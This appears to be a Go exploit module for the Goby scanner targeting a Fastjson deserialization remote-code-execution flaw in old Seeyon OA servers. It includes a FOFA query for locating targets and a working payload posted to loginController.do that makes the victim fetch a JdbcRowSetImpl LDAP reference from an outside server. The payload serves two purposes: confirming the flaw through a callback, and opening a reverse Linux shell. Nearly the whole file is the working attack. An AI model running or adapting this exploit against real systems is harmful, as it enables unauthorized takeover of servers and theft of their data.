package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Seeyon OA Fastjson loginController.do RCE",
    "Description": "The old version of Seeyon OA software (below V8.0, V8.0 was released on June 11, 2020) integrated Fastjson component has a deserialization vulnerability",
    "Product": "Yonyou-Seeyon-OA",
    "Homepage": "https://www.netentsec.com/",
    "DisclosureDate": "2021-06-08",
    "Author": "go0p",
    "FofaQuery": "app=\"Yonyou-Seeyon-OA\" || app=\"Zhiyuan Interconnection - OA\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "Yonyou-Seeyon-OA has released a vulnerability announcement on its official website in September 2020 (http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8% A1%A5%E4%B8%81&amp;id=12), update the patch to complete the Fastjson vulnerability repair, and contact each customer to proactively inform.",
    "References": [
        "https://www.secrss.com/articles/30425"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "AttackType",
            "Type": "select",
            "Value": "goby_shell_linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "Yonyou-Seeyon-OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10205"
}`
	doPost := func(u *httpclient.FixUrl, cmd string) string {

		cfg := httpclient.NewPostRequestConfig("/seeyon/m3/loginController.do?method=transLogout")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = fmt.Sprintf("statisticId={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"%s\", \"autoCommit\":true}\n", cmd)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		} else {
			return ""
		}
	}
	wantStr := func(s string) string {
		vList := strings.FieldsFunc(s, func(c rune) bool {
			switch c {
			case '\t', '\n', '\v', '\f', '\r', 0x00, 0x85, 0xA0:
				return true
			}
			return false
		})
		newV := ""
		for _, str := range vList {
			newV += str
		}
		return newV
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			pocStr := "ldap://" + checkUrl
			doPost(u, pocStr)
			if godclient.PullExists(randomHex, time.Second*15) {
				ss.VulURL = u.String()
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					ldapServerAddr := "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
					doPost(expResult.HostInfo, ldapServerAddr)
					select {
					case webConsleID := <-waitSessionCh:
						webConsleID = wantStr(webConsleID)
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}

			return expResult
		},
	))
}
